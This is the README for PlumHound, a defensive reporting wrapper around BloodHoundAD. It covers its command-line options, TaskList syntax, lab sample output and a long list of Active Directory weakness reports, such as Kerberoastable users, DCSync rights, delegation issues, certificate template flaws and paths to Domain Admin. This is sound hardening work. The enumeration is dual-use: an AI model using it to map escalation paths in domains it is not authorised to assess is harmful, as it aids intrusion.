[![PlumHound](https://raw.githubusercontent.com/DefensiveOrigins/PlumHound/master/docs/images/Plum3.jpg)](https://raw.githubusercontent.com/DefensiveOrigins/PlumHound/master/docs/images/Plum3.jpg)

# PlumHound - BloodHoundAD Report Engine for Security Teams

[](https://github.com/PlumHound/PlumHound#plumhound---bloodhoundad-report-engine-for-security-teams)

Released as Proof of Concept for Blue and Purple teams to more effectively use BloodHoundAD in continual security life-cycles by utilizing the BloodHoundAD pathfinding engine to identify Active Directory security vulnerabilities resulting from business operations, procedures, policies and legacy service operations.

PlumHound operates by wrapping BloodHoundAD's powerhouse graphical Neo4J backend cypher queries into operations-consumable reports. Analyzing the output of PlumHound can steer security teams in identifying and hardening common Active Directory configuration vulnerabilities and oversights.

- [Release and call to Action](https://github.com/PlumHound/PlumHound#release-and-call-to-action)
- [Background](https://github.com/PlumHound/PlumHound#background)
- [Sample Reports](https://github.com/PlumHound/PlumHound#sample-reports)
- [PlumHound Examples](https://github.com/PlumHound/PlumHound#plumhound-examples)
    - [Default Task List and Default Credentials](https://github.com/PlumHound/PlumHound#default-task-list-and-default-credentials)
    - [Default Task List, Specified Neo4j Server and Quiet Output](https://github.com/PlumHound/PlumHound#default-task-list-specified-neo4j-server-and-quiet-output)
    - [Path Analyzer (BlueHound Module)](https://github.com/PlumHound/PlumHound#path-analyzer-bluehound-module)
        - [Option #1](https://github.com/PlumHound/PlumHound#option-1)
        - [Option #2](https://github.com/PlumHound/PlumHound#option-2)
    - [Busiest Path (BlueHound Module)](https://github.com/PlumHound/PlumHound#busiest-path-bluehound-module)
        - [Busiest Shortest Path to DA](https://github.com/PlumHound/PlumHound#busiest-shortest-path-to-da)
        - [Busiest All Path to DA](https://github.com/PlumHound/PlumHound#busiest-all-path-to-da)
    - [Detailed PlumHound Syntax](https://github.com/PlumHound/PlumHound#detailed-plumhound-syntax)
- [Database Connection](https://github.com/PlumHound/PlumHound#database-connection)
- [HTML Report Design Output and Variables](https://github.com/PlumHound/PlumHound#html-report-design-output-and-variables)
- [TaskList Files](https://github.com/PlumHound/PlumHound#tasklist-files)
    - [TaskList File Syntax](https://github.com/PlumHound/PlumHound#tasklist-file-syntax)
    - [TaskList Sample: default.tasks](https://github.com/PlumHound/PlumHound#tasklist-sample-defaulttasks)
- [Execution Modes](https://github.com/PlumHound/PlumHound#execution-modes)
    - [Tasks Mode](https://github.com/PlumHound/PlumHound#tasks-mode)
    - [Single Query Mode](https://github.com/PlumHound/PlumHound#single-query-mode)
        - [Single Query with Standard Output (Normal Verbosity)](https://github.com/PlumHound/PlumHound#single-query-with-standard-output-normal-verbosity)
        - [Single Query with Standard Output (Quiet)](https://github.com/PlumHound/PlumHound#single-query-with-standard-output-quiet)
    - [Busiest Path (BlueHound Module)](https://github.com/PlumHound/PlumHound#busiest-path-bluehound-module-1)
    - [Analyze Path (BlueHound Module)](https://github.com/PlumHound/PlumHound#analyze-path-bluehound-module)
- [Additional Modules](https://github.com/PlumHound/PlumHound#additional-modules)
    - [Report Indexer Moodule](https://github.com/PlumHound/PlumHound#report-indexer-moodule)
        - [Report Indexer Task Syntax](https://github.com/PlumHound/PlumHound#report-indexer-task-syntax)
    - [TaskZipper Module](https://github.com/PlumHound/PlumHound#taskzipper-module)
        - [TaskZipper Task Syntax](https://github.com/PlumHound/PlumHound#taskzipper-task-syntax)
- [Logging](https://github.com/PlumHound/PlumHound#logging)
- [Hat-Tips & Acknowledgments](https://github.com/PlumHound/PlumHound#hat-tips--acknowledgments)
- [Presentations](https://github.com/PlumHound/PlumHound#presentations)
- [Installation Requirements](https://github.com/PlumHound/PlumHound#installation-requirements)
- [Environment Setup Instructions](https://github.com/PlumHound/PlumHound#environment-setup-instructions)
- [Known Issues](https://github.com/PlumHound/PlumHound#known-issues)
- [Collaboration](https://github.com/PlumHound/PlumHound#collaboration)
- [License](https://github.com/PlumHound/PlumHound#license)
- [Additional Inclusions:](https://github.com/PlumHound/PlumHound#additional-inclusions)

## Release and call to Action

[](https://github.com/PlumHound/PlumHound#release-and-call-to-action)

The initial PlumHound code was released on May 14th, 2020 during a Black Hills Information Security webcast, A Blue Teams Perspective on Red Team Tools. The webcast was recorded and is available on YouTube.¬†[A Blue Team's Perspective on Red Team Tools](https://youtu.be/0mIN2OU5hQEs).

The PlumHound Framework yields itself to community involvement in the creation and proliferation of "TaskLists" (work) that can be shared and used across different organizations. TaskLists contain jobs for PlumHound to do (queries to run, reports to write). A second PlumHound community repo has been created to allow for the open sharing of TaskLists (see¬†[Plumhound-Tasks](https://github.com/DefensiveOrigins/PlumHound-Tasks))

Looking for more tasks and templates? Checkout¬†[PlumHound-Tasks](https://github.com/DefensiveOrigins/PlumHound-Tasks)¬†for the community driven marketplace of PlumHound reporting taskslists and report designs

## Background

[](https://github.com/PlumHound/PlumHound#background)

A client of ours working on hardening their Active Directory infrastructure asked us about vulnerabilities that can be found by using BloodHound. They had heard of the effectiveness of BloodHoundAD in Red-Team's hands and was told that BloodHound would identify all types of security mis-alignments and mis-configurations in their Active Directory environment. We helped them through analysis of their BloodHound dataset and it became quickly evident that BloodHoundAD's pathfinding graphical database was not designed for the fast-passed analytical security team accustom to reading reports and action items.

In fact, one of our cypher queries determined that 96% of their 3000 users had a path to Domain Admin with an average of just 4 steps. However, that graphical query rendered over 10,000 paths to Domain Admin. Finding the actual cause of the short-paths to DA wasn't as easy as just loading data into BloodHound or putting Cobalt Strike on Auto-Pilot with BloodHound Navigation.  
Hence, PlumHound was created out of a need to retrieve consumable data from BloodHoundAD's pathfinding engine. Data that could yield itself to inferring actionable work for security teams to harden their environments.

## Sample Reports

[](https://github.com/PlumHound/PlumHound#sample-reports)

We include some sample reports in this respository, however the data represents a fictious small Active Directory deployment atypical of a production environment. The default tasks tasklist will produce reports with ease. Here are a sample of some less-exciting reports generated from a small lab environment. A few samples of produced reports are shown below.

The archive of sample reports is found here:¬†[SampleReports](https://github.com/PlumHound/PlumHound/raw/master/docs/SampleReports.zip)

|[![Report Index](https://github.com/PlumHound/PlumHound/raw/master/docs/images/report_index.png)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/report_index.png)|
|---|

|[![Report1](https://github.com/PlumHound/PlumHound/raw/master/docs/images/report1.png)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/report1.png)|
|---|

|[![Report2](https://github.com/PlumHound/PlumHound/raw/master/docs/images/report2.png)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/report2.png)|
|---|

|[![Report3](https://github.com/PlumHound/PlumHound/raw/master/docs/images/report3.png)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/report3.png)|
|---|

|[![Report4](https://github.com/PlumHound/PlumHound/raw/master/docs/images/report4.png)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/report4.png)|
|---|

|[![Report5](https://github.com/PlumHound/PlumHound/raw/master/docs/images/report5.png)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/report5.png)|
|---|

The default tasklist generates the following reports:

- Domains
- Domain Trusts
- Domain Controllers
- Domain Controllers - Read Only
- Enterprise Admins
- Schema Admins
- Domain Admins
- Admin Groups
- Admin Groups Direct Population
- Domain Users
- Domain Computers
- Domain Groups
- OUs By Computer Member Count
- OUs By User Member Count
- OUs By Group Member Count
- Cert Publishers
- DA Sessions
- EA Sessions
- User Sessions Count
- HighValue Group Members (Limited to 1000)
- Protected Users Group
- Admins Without Sensitive Protection Flag
- Kerberoastable Users
- Pre-Windows 2000 Compatibility Access Direct Members
- RDPable Servers
- Domain Controller Owners
- Domain Controller Owned by Users
- Unconstrained Delegation Users with SPN
- Unconstrained Delegation Computers with SPN
- Unconstrained Delegation Computers with SPN Non-DC
- Constrained Delegation - All
- Constrained Delegation - Users
- Constrained Delegation - Users NonDA
- Constrained Delegation - Computers NonDC
- DCSync Direct Relationships
- DCSync Privileged Non-DCs
- DCSync Privileged Non-DAs
- Permissions for Everyone and Authenticated Users
- Users (Non-Admin) With AddMember Group Permissions
- Direct Relationships - Everyone
- Direct Relationships - Authenticated Users
- Direct Relationships - Pre-Windows 2000 Compatibility Access
- Direct Relationships - Domain Users
- Direct Relationships - Domain Computers
- Direct Relationships - Users
- Direct Relationships - Guests
- PasswordResetter Groups Count
- GPOs
- GPO OU Links
- GPO Owners Summary Count
- GPO Owners Detail
- GPO Owners - Non-DAs
- GPOS - Non-DA Users With Interesting GPO Permissions
- GPO Creator Owners
- RDPable Groups
- RDPable Groups Count
- Computers Vulnerable to Local Admin Enumeration
- Local Admins - Groups
- Local Admins - Groups Count
- Local Admins - Users
- Local Admins - Users Count
- Local Admins - Computers
- Local Admins - Computers Count
- Computers with MSSQL SPN
- Computers with Descriptions
- Operating Systems Unsupported
- Operating Systems Unsupported Count
- Operating Systems Count
- LAPS Deployment Count
- LAPS Deployment OS Count
- LAPS Not Enabled
- Users Sessions
- Users Sessions Count
- Users With < 1 Day Old Passwords
- Users With < 7 Day Old Passwords
- Users With < 30 Day Old Passwords
- Users With > 6 Month Old Passwords
- Users With > 1 Year Old Passwords
- Users With > 5 Year Old Passwords
- Users With > 10 Year Old Passwords
- Users With > 15 Year Old Passwords
- Users With > 20 Year Old Passwords
- Users Password Never Expires Exception
- Users Password Not Required
- Users Password Not Required and Never Set
- Users With Userpassword Attribute
- User No Kerb Needed (AS-REP Roastable Users)
- Users Not Active 6 Months
- Users Not Active 12 Months
- Users Not Active 60 Months
- Users Not Active 120 Months
- Users Never Active
- Hunt - Users with Pass or PW in Description
- Hunt - Users with Change in Description
- Hunt - Users with VPN Group
- Hunt - Computers with Pass or PW in Description
- Owned Groups
- Owned Users
- Owned Computers
- Owned Users Groups
- Owned Computers Groups
- Owned Objects
- Owned Objects Admin To
- Owned Objects Member Of
- Certificate Templates
- Certificate Authorities
- Certificate Enrollment Rights
- Certificate Template ESC1 Vuln
- Certificate Template ESC2 Vuln
- Certificate Template ESC3 Vuln
- Certificate Template ESC6 Vuln
- Certificate Template ESC8 Vuln
- Report Index

# PlumHound Examples

[](https://github.com/PlumHound/PlumHound#plumhound-examples)

Use the default username, password, server, and execute the "Easy" task, to test connectivity. This will output all Active Directory user objects from the Neo4J database.

```shell
python3 PlumHound.py --easy
```

## Default Task List and Default Credentials

[](https://github.com/PlumHound/PlumHound#default-task-list-and-default-credentials)

Execute PlumHound with the Default TaskList using Default Credentials (neo4j:neo4jneo4j) and Database.

```shell
python3 PlumHound.py -x tasks/default.tasks
```

## Default Task List, Specified Neo4j Server and Quiet Output

[](https://github.com/PlumHound/PlumHound#default-task-list-specified-neo4j-server-and-quiet-output)

The same, but quiet the output (-v 0), specify the Neo4J server, username, and password instead of using defaults.

```shell
python3 PlumHound.py -x tasks/default.tasks -s "bolt://127.0.0.1:7687" -u "neo4j" -p "neo4jneo4j" -v 0
```

## Path Analyzer (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#path-analyzer-bluehound-module)

### Option #1

[](https://github.com/PlumHound/PlumHound#option-1)

Using label. The supported labels are¬†`User`,¬†`Group`,¬†`Computer`,¬†`OU`¬†and¬†`GPO`. This function will assume the target group is "DOMAIN ADMINS".

```shell
python3 PlumHound.py -ap user
```

**NOTE:**¬†The above syntax implies you are using the default values for¬†`sever`,¬†`user`¬†and¬†`password`¬†or that you have hard-coded them in the script.

### Option #2

[](https://github.com/PlumHound/PlumHound#option-2)

specify¬†`start node`¬†and¬†`end node`¬†

```shell
python3 PlumHound.py -ap "domain users@example.com" "domain admins@example.com"
```

**NOTE:**¬†To use BlueHound Path Analyzer logic you need to get a copy of the Python script from¬†[https://github.com/scoubi/BlueHound](https://github.com/scoubi/BlueHound)

## Busiest Path (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#busiest-path-bluehound-module)

The Busiest Path(s) function takes two parameters

### Busiest Shortest Path to DA

[](https://github.com/PlumHound/PlumHound#busiest-shortest-path-to-da)

Find the shortest path that give users Domain Admin (top 5)

```
PlumHound.py -bp short 5
```

### Busiest All Path to DA

[](https://github.com/PlumHound/PlumHound#busiest-all-path-to-da)

Find the busiest path irregardless of length (top 5) to give users Domain Admin

```
PlumHound.py -bp all 5
```

---

## Detailed PlumHound Syntax

[](https://github.com/PlumHound/PlumHound#detailed-plumhound-syntax)

```
usage: PlumHound.py [-h] [-s SERVER] [-u USERNAME] [-p PASSWORD] [--UseEnc]
                    (--easy | -x TASKFILE | -q,--QuerySingle QUERYSINGLE | -bp,--BusiestPath BUSIESTPATH [BUSIESTPATH ...] | -ap,--AnalyzePath ANALYZEPATH [ANALYZEPATH ...])
                    [-t TITLE] [--of OUTFILE] [--op PATH] [--ox {stdout,HTML,CSV}] [--HTMLHeader HTMLHEADER] [--HTMLFooter HTMLFOOTER] [--HTMLCSS HTMLCSS]
                    [-v VERBOSE]

BloodHound Wrapper for Blue/Purple Teams; v01.070a

optional arguments:
  -h, --help            show this help message and exit
  --easy                Test Database Connection, Returns Domain Users to stdout
  -x TASKFILE, --TaskFile TASKFILE
                        Specify a PlumHound TaskList File
  -q,--QuerySingle QUERYSINGLE
                        Specify a Single Cypher Query
  -bp,--BusiestPath BUSIESTPATH [BUSIESTPATH ...]
                        Find the X Shortest Paths that give the most users a path to Domain Admins. Need to specified [short|all] for shortestpath and the
                        number of results. Ex: PlumHound -bp all 3
  -ap,--AnalyzePath ANALYZEPATH [ANALYZEPATH ...]
                        Analyze 'Attack Paths' between two nodes and find which path needs to be remediated to brake the path.

DATABASE:
  -s SERVER, --server SERVER
                        Neo4J Server
  -u USERNAME, --username USERNAME
                        Neo4J Database Useranme
  -p PASSWORD, --password PASSWORD
                        Neo4J Database Password
  --UseEnc              Use encryption when connecting.

OUTPUT:
  Output Options (For single cypher queries only. --These options are ignored when -x or --easy is specified.

  -t TITLE, --title TITLE
                        Report Title for Single Query [HTML,CSV,Latex]
  --of OUTFILE, --OutFile OUTFILE
                        Specify a Single Cypher Query
  --op PATH, --OutPath PATH
                        Specify an Output Path for Reports
  --ox {stdout,HTML,CSV}, --OutFormat {stdout,HTML,CSV}
                        Specify the type of output

HTML:
  Options for HTML Output (For single queries or TaskLists

  --HTMLHeader HTMLHEADER
                        HTML Header (file) of Report
  --HTMLFooter HTMLFOOTER
                        HTML Footer (file) of Report
  --HTMLCSS HTMLCSS     Specify a CSS template for HTML Output

VERBOSESet verbosity:
  -v VERBOSE, --verbose VERBOSE
                        Verbosity 0-1000, 0 = quiet

For more information see https://plumhound.DefensiveOrigins.com
```

# Database Connection

[](https://github.com/PlumHound/PlumHound#database-connection)

PlumHound needs to connect to the Neo4J graphing database where BloodHoundAD data was loaded.

```
DATABASE:
  -s SERVER, --server SERVER
                        Neo4J Server
  -u USERNAME, --username USERNAME
                        Neo4J Database Useranme
  -p PASSWORD, --password PASSWORD
                        Neo4J Database Password
  --UseEnc              Use encryption when connect
```

PlumHound paramters are set by default. You can override the default by including the argument.

|Argument/Parameter|Default|
|---|---|
|SERVER|bolt://localhost:7687|
|USERNAME|neo4j|
|PASSWORD|neo4jneo4j|

# HTML Report Design Output and Variables

[](https://github.com/PlumHound/PlumHound#html-report-design-output-and-variables)

HTML output includes the ability to use HTML Headers, Footers, and CSS to modify the design of the report. Additionaly, variables can be added to the HTML Header and Footer files that are replaced at runtime.

```
HTML:
  Options for HTML Output (For single queries or TaskLists

  --HTMLHeader HTMLHEADER
                        HTML Header (file) of Report
  --HTMLFooter HTMLFOOTER
                        HTML Footer (file) of Report
  --HTMLCSS HTMLCSS     Specify a CSS template for HTML Output
```

|Argument/Parameter|Default|
|---|---|
|HTMLHeader|templates/head.html|
|HTMLFooter|templates/tail.html|
|HTMLCSS|templates/html.css|

|Variable|Output|
|---|---|
|--------PH_TITLE-------|Report Tile from --Title or TaskList/Job|
|--------PH_DATE-------|Python date.today()|

This allows the HTML output to be dynamic and tailored to your specification.

# TaskList Files

[](https://github.com/PlumHound/PlumHound#tasklist-files)

The PlumHound Repo includes a sample TaskList that exports some basic BloodHoundAD Cypher queries to an HTML Report. The included tasks\Default.tasks sample shows the basic syntax of the TaskList files. The TaskList Files allow PlumHound to be fully scripted with batch jobs after the SharpHound dataset has been imported not BloodHoundAD on Neo4j. Looking for more tasks and templates? Checkout¬†[PlumHound-Tasks](https://github.com/DefensiveOrigins/PlumHound-Tasks)¬†for the community driven marketplace of PlumHound reporting taskslists and report designs.

## TaskList File Syntax

[](https://github.com/PlumHound/PlumHound#tasklist-file-syntax)

The TaskList file syntax is as follows. Note that any cypher query containing a double quote must be modified to use a single quote instead of double.

```
["Report Title","[Output-Format]","[Output-File]","[CypherQuery]"]
```

Output-Format options for TaskLists:

- **HTML**: Generates a HTML Report
- **CSV**: Generates a CSV of data
- **HTMLCSV**: Generates both an HTML report and CSV data.
    - NOTE: DO not include a file-extension in the Output-File paramter.

Additional Modules in TaskLists:

- Report Index: to use the Report-Index module in a TaskList, use CypherQuery "REPORT-INDEX"

## TaskList Sample: default.tasks

[](https://github.com/PlumHound/PlumHound#tasklist-sample-defaulttasks)

The default.tasks file includes multiple tasks that instruct PlumHound to create reports using the specified "HTML" output format, output filename, and specific BloodHoundAD Neo4JS cypher Query. See the Tasks mode below in the Execution modes section for additional information.

```
PlumHound.py -x tasks/default.tasks
```

# Execution Modes

[](https://github.com/PlumHound/PlumHound#execution-modes)

There are multiple execution modes to get PlumHound to do work.

- Tasks Mode
- Single Query Mode
- BusiestPath Mode (BlueHound Module)
- AnalyzePath Mode (BlueHound Module)

## Tasks Mode

[](https://github.com/PlumHound/PlumHound#tasks-mode)

By specifying a task list, PlumHound can be programmed to run multiple cypher queries and export to multiple formats. For more information on the tasks file, see the section above.

[![](https://github.com/PlumHound/PlumHound/raw/master/docs/images/ph14.gif)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/ph14.gif)

## Single Query Mode

[](https://github.com/PlumHound/PlumHound#single-query-mode)

This mode allows you to run a single query and export to standard output, HTML, or CSV.

### Single Query with Standard Output (Normal Verbosity)

[](https://github.com/PlumHound/PlumHound#single-query-with-standard-output-normal-verbosity)

```
PlumHound.py -q "MATCH (n:User) RETURN n.name, n.displayname LIMIT 10"

       PlumHound 1.4
        For more information: https://github.com/plumhound
        --------------------------------------
        Server: bolt://localhost:7687
        User: neo4j
        Password: *****
        Encryption: False
        Timeout: 300
        --------------------------------------
        Task: Single Query
        Query Title: Adhoc Query
        Query Format: STDOUT
        Query Path: reports//
on 1:
on 1: n.name                    n.displayname
      ------------------------  ----------------
      ASADMIN@ASAZLAB.COM
      KRBTGT@ASAZLAB.COM
      GUEST@ASAZLAB.COM
      DATAANALYST@ASAZLAB.COM   HelpdeskUser
      HELPDESKUSER@ASAZLAB.COM  HelpdeskUser
      FILEADMIN@ASAZLAB.COM     FileServiceAdmin
      CHARLIEADMIN@ASAZLAB.COM  ITAdmin
      ITADMIN@ASAZLAB.COM       ITAdmin
      SSILVER@ASAZLAB.COM       Silver Sandy
on 1:
         Executing Tasks |‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| Tasks 1 / 1  in 0.2s (4.40/s)

        Completed 1 of 1 tasks.


```

### Single Query with Standard Output (Quiet)

[](https://github.com/PlumHound/PlumHound#single-query-with-standard-output-quiet)

By turning the verbosity to zero, this can act as a direct Neo4J handler for queries.

```
PlumHound.py -q "MATCH (n:User) RETURN n.name, n.displayname LIMIT 10" -v 0
on 1:
on 1: n.name                    n.displayname
      ------------------------  ----------------
      ASADMIN@ASAZLAB.COM
      KRBTGT@ASAZLAB.COM
      GUEST@ASAZLAB.COM
      DATAANALYST@ASAZLAB.COM   HelpdeskUser
      HELPDESKUSER@ASAZLAB.COM  HelpdeskUser
      FILEADMIN@ASAZLAB.COM     FileServiceAdmin
      CHARLIEADMIN@ASAZLAB.COM  ITAdmin
      ITADMIN@ASAZLAB.COM       ITAdmin
      SSILVER@ASAZLAB.COM       Silver Sandy
on 1:
         Executing Tasks |‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| Tasks 1 / 1  in 0.2s (4.33/s)

```

The single query can also be used to generate HTML reports instead of outputting to STDOUT.

```
PlumHound.py -q "MATCH (n:User) RETURN n.name, n.displayname LIMIT 10" --title "Domain Users (Limit 10)" --of "DomainUserstest.html" --op "reports//" --ox HTML
```

## Busiest Path (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#busiest-path-bluehound-module-1)

The Busiest Path(s) function takes two parameters 1-¬†`all`¬†or¬†`short`¬†either you want to use¬†`shortestpath`¬†or¬†`allshorteshpaths`¬†algorithym. 2- The number of results you want to return. ex: Top 5

```
PlumHound.py -bp short 5
[*]Building Task List
[51, 'IT00385@BTV.ORG']
[51, 'IT00346@BTV.ORG']
[50, 'IT01186@BTV.ORG']
[49, 'IT00435@BTV.ORG']
[49, 'IT00333@BTV.ORG']
[*]Tasks Generation Completed
Tasks: []
```

## Analyze Path (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#analyze-path-bluehound-module)

The Analyze Path takes either a¬†`label`¬†or a¬†`start node`¬†and¬†`end node`¬†and loop through all the paths finding which relationship(s) need to be broken in order to break the whole path. This is useful when you want to provide your AD Admins with concrete actions they can take in order to improuve your overall AD Security Posture.

```
PlumHound.py -ap group
[...]
---------------------------------------------------------------------
Analyzing paths between IT00738@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
Removing the relationship CanRDP between IT00738@BTV.ORG and COMP00886.BTV.ORG breaks the path!
Removing the relationship HasSession between COMP00886.BTV.ORG and EKRITIKOS00681@BTV.ORG breaks the path!
---------------------------------------------------------------------
Analyzing paths between IT00803@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
---------------------------------------------------------------------
Analyzing paths between IT00854@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
---------------------------------------------------------------------
Analyzing paths between IT00870@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
Removing the relationship ExecuteDCOM between IT00870@BTV.ORG and COMP00629.BTV.ORG breaks the path!
Removing the relationship HasSession between COMP00629.BTV.ORG and YWINES00123@BTV.ORG breaks the path!
Removing the relationship MemberOf between YWINES00123@BTV.ORG and HR01256@BTV.ORG breaks the path!
Removing the relationship MemberOf between HR01256@BTV.ORG and IT01085@BTV.ORG breaks the path!
---------------------------------------------------------------------
Analyzing paths between IT00874@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
Removing the relationship AdminTo between IT00874@BTV.ORG and COMP01055.BTV.ORG breaks the path!
Removing the relationship HasSession between COMP01055.BTV.ORG and LJARAD00311@BTV.ORG breaks the path!
Removing the relationship MemberOf between LJARAD00311@BTV.ORG and HR00694@BTV.ORG breaks the path!
Removing the relationship MemberOf between HR00694@BTV.ORG and IT01182@BTV.ORG breaks the path!
Removing the relationship AdminTo between IT01182@BTV.ORG and COMP00658.BTV.ORG breaks the path!
Removing the relationship AllowedToDelegate between COMP00658.BTV.ORG and COMP01387.BTV.ORG breaks the path!
Removing the relationship AllowedToDelegate between COMP01387.BTV.ORG and COMP00275.BTV.ORG breaks the path!
Removing the relationship HasSession between COMP00275.BTV.ORG and RHETZLER01120@BTV.ORG breaks the path!
Removing the relationship MemberOf between RHETZLER01120@BTV.ORG and DOMAIN ADMINS@BTV.ORG breaks the path!
---------------------------------------------------------------------
Analyzing paths between IT00487@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
---------------------------------------------------------------------
Analyzing paths between IT00547@BTV.ORG and DOMAIN ADMINS@BTV.ORG
---------------------------------------------------------------------
[...]
```

---

## AzHound (Basic Path Analysis of AzureHound Data)

[](https://github.com/PlumHound/PlumHound#azhound-basic-path-analysis-of-azurehound-data)

Valid pre-sets are¬†`ALL`,¬†`AZUser`,¬†`AZGroup`,¬†`AZApp`,¬†`AZServicePrincipal`,¬†`AZDevice`. All presets search for relationships with¬†`Global Administrator`.

```
Plumhound.py -az ALL
[...]
```

# Additional Modules

[](https://github.com/PlumHound/PlumHound#additional-modules)

Additional modules will be documented here.

## Report Indexer Moodule

[](https://github.com/PlumHound/PlumHound#report-indexer-moodule)

The report indexer builds an HTML report of all the completed jobs. Add the following job to a task list. The parameter = "REPORT-INDEX" instructs PlumHound to generate an HTML index of all the successfully exported tasks in that run of tasks.

### Report Indexer Task Syntax

[](https://github.com/PlumHound/PlumHound#report-indexer-task-syntax)

```
["Report Index","HTML","Reports.html","REPORT-INDEX"]
```

## TaskZipper Module

[](https://github.com/PlumHound/PlumHound#taskzipper-module)

The Taskzipper module will create a zipfile of all of the reports generated from a tasklist. Be sure that the Zip Module is included as the last task in a last list. The paramter = "ZIP-TASKS" instructs PlumHound to generate a ZIP file of all the sucessfuly exported tatsks in that run of tasks.

### TaskZipper Task Syntax

[](https://github.com/PlumHound/PlumHound#taskzipper-task-syntax)

```
["Zip Tasks","ZIP","Reports.zip","ZIP-TASKS"]
```

# Logging

[](https://github.com/PlumHound/PlumHound#logging)

By default, PlumHound generates a log in file log\PlumHound.log

# Hat-Tips & Acknowledgments

[](https://github.com/PlumHound/PlumHound#hat-tips--acknowledgments)

- [Hausec's Cypher Query CheatSheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)¬†gave us a headstart on some decent pathfinding cypher queries. |¬†[Git](https://github.com/hausec)
- [SadProcessor's Blue Hands on BloodHound](https://github.com/SadProcessor/WatchDog)¬†gave us a detailed primer on BloodHoundAD's ability to lead a BlueTeam to water. |¬†[Git](https://github.com/SadProcessor).
- Additional work by SadProcessor with¬†[Cypher Dog 3.0](https://github.com/SadProcessor/CypherDog)¬†shows similar POC via utilizing BloodHoundAD's Cypher Queries with a RestAPI endpoint via PowerShell. PlumHound operates similarly however written in python and designed for stringing multiple queries into consumable reports designed to infer actionable items.
- [BloodHoundAD](https://github.com/BloodHoundAD/BloodHound): We wouldn't be talking about this at all if it weren't for the original BloodHoundAD work. BloodHound is developed by @_wald0, @CptJesus, and @harmj0y.
- "Band-aids don't fix dank domains."¬†[BadBlood](https://github.com/davidprowe/BadBlood)¬†saved us a ton of time building realistic-enough AD domains for testing. @davidprowe
- [BloodHound from Red to Blue](https://www.youtube.com/watch?v=-HPhJw9K6_Y)¬†- Scoubi- Mathieu Saulnier Mathieu merged his BlueHound project with PlumHound in 2020 as a extension of features. Mathieu is an active collaborator of PlumHound and the BlueHound path-finding extension.

# Presentations

[](https://github.com/PlumHound/PlumHound#presentations)

- BHIS Webcast:¬†[A Blue Team's Perspective on Red Team Hack Tools](https://www.youtube.com/watch?v=0mIN2OU5hQE)
- Sector Session:¬†[BlueHound Path Destroyer](https://sector.ca/sessions/bhpd-bluehound-path-destroyer/)
- BHIS Blog:¬†[PlumHound Reporting Engine for BloodHoundAD](https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/)

# Installation Requirements

[](https://github.com/PlumHound/PlumHound#installation-requirements)

```shell
apt-get install python3
pip3 install -r requirements.txt
```

- Tested with Python 3.10.6 and 3.11.0rc1*

# Environment Setup Instructions

[](https://github.com/PlumHound/PlumHound#environment-setup-instructions)

- Install Neo4J
- Install BloodhoundAD
- Import AD dataset into BloodhoundAD to be parsed
- Use PlumHound to Report

# Known Issues

[](https://github.com/PlumHound/PlumHound#known-issues)

- Please report as issue on GitHub

# Collaboration

[](https://github.com/PlumHound/PlumHound#collaboration)

Help PlumHound grow and be a great tool for Blue and Purple Teams. We've created the initial proof of concept and are committed to continuing the maturity of PlumHound to leverage the power of BloodHoundAD into continual security improvement processes. Community involvement is what makes this industry great!

- [Black Hills Information Security](https://www.blackhillsinfosec.com/)¬†-¬†[@BHInfoSecurity](https://twitter.com/BHinfoSecurity)¬†-¬†[Discord](https://discord.gg/J4UJPgG)
- [Defensive Origins](https://www.defensiveorigins.com/)¬†-¬†[@DefensiveOGs](https://twitter.com/DefensiveOGs)¬†-¬†[Git](https://github.com/DefensiveOrigins)
- Kent Ickler -¬†[@Krelkci](https://twitter.com/Krelkci)¬†-¬†[Git](https://github.com/Relkci)
- Jordan Drysdale -¬†[@Rev10D](https://twitter.com/Rev10D)¬†-¬†[Git](https://github.com/rev10d)
- Mathieu Saulnier -¬†[@Scoubi](https://twitter.com/ScoubiMtl)¬†-¬†[Git](https://github.com/Scoubi)

# License

[](https://github.com/PlumHound/PlumHound#license)

[GNU GPL3](https://github.com/DefensiveOrigins/PlumHound/blob/master/LICENSE)

# Additional Inclusions:

[](https://github.com/PlumHound/PlumHound#additional-inclusions)

- table-sort-js¬†[https://github.com/LeeWannacott/table-sort-js](https://github.com/LeeWannacott/table-sort-js)¬†provides sorting for HTML reports (in templates/head.html).

**Credit:**¬†This information was adapted from an excellent guide on¬†[GitHub](https://github.com/PlumHound/PlumHound). Be sure to check out the original post for more details.

# BloodHound + PlumHound = ‚ù§

